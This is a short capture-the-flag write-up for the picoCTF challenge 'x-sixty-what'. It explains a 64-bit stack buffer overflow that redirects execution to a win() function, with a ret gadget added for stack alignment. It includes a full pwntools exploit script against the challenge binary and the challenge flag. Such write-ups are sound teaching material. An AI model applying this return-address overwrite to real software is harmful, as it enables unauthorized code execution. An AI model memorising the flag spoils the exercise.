# x-sixty-what

### Description
> Overflow x64 code

### Solution
It just causes an overflow and overwrites the return address with the `win()` address.

But, that's not enough to get the flag.
Put `ret` gadget in order to align an address.

```python
from pwn import *

file = "./vuln"
host = "saturn.picoctf.net"
port = 52962
context(os = 'linux', arch = 'amd64')
context.log_level = 'debug'

win = 0x00401236
ret = 0x0040101a

#io = remote(host, port)
io = process(file)
pld = b"A"*72
pld += p64(ret)
pld += p64(win)

io.sendlineafter("flag:", pld)

io.interactive()
#picoCTF{b1663r_15_b3773r_ec424efd}
```

### Writer
[yu1hpa](https://twitter.com/yu1hpa)
